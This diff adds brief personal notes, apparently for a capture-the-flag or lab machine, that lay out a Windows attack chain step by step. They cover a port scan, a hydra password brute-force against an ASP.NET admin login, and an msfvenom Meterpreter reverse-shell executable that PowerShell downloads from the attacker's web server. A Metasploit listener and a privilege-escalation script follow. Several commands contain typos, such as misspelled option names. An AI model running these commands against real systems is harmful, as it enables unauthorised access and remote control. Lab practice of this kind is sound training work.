@@ -1,0 +1,25 @@
+namp -sC -sV -oN x.x.x.x -Pn  (port scan)
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.67.228 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=vG5hoO3NIjMtIA%2FpvQrsDVqLT6KbZDaBVDFAEEFKeP0hMBYaBxYmtDrJ%2F%2FU6Xa5vszCUz0Mabw3I95jQNpQnJU7KopqQOypmqxEtxUd0bSbiWAh6GY1UoknKWU22iWRdZda1HiWeWKv5jYMv4wx%2BQjBsXtXlpvM6wbJS9TyeJxdeP1PiPwDVc6R9LwnvIXl0BidrAfk8mZ%2FPJ1hQ%2Fhm%2FJMS%2B84C1Yg00YpFn9Zbn8Tim5o5l1SOtTXXONNYIOoB03hsvaOLt19Pd0nsBgDOufmeRwxv79WrTD%2FSuOIl4qw8OMXPQeQVkz%2BFUE29LFYpYS7zBNbgjKXischADFee%2B2v3yyho5qhNu2zpO0yyaxnM%2FMTlH&__EVENTVALIDATION=u%2FA85UzgtEdnxIraaolo2WR9Bv3m4eD8jOdrtQ70Rf1VSZ11JANkUVfBHtExmQUvS8FI4C7hp4M2Ei%2FaGmGgUFe2mMB99iteBuXFisenHNZihByKn%2FnvsXnx%2BcHRrnmUyi9P8630Mh4aY9T1lovvfaZKvKSKrofmqgwx%2F%2Fa4B02Ljxe0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:login failed" -vv
+
+https://www.exploit-db.com/exploits/46353
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Privelege Escalation 
+
+create payload
+msfvenom -p windows/meterpreter/reverse_tcp lHSOT=10.10.80.131 LPROT=8888 -f exe > shell.exe
+
+run python web server
+python3 -m http.server
+
+Donload shell form powershell
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.80.131:8000/shell.exe' -OutFile shell.exe
+
+Metaspilot Listner
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+download winPEAS.bat (For Check Privilage)
+https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat
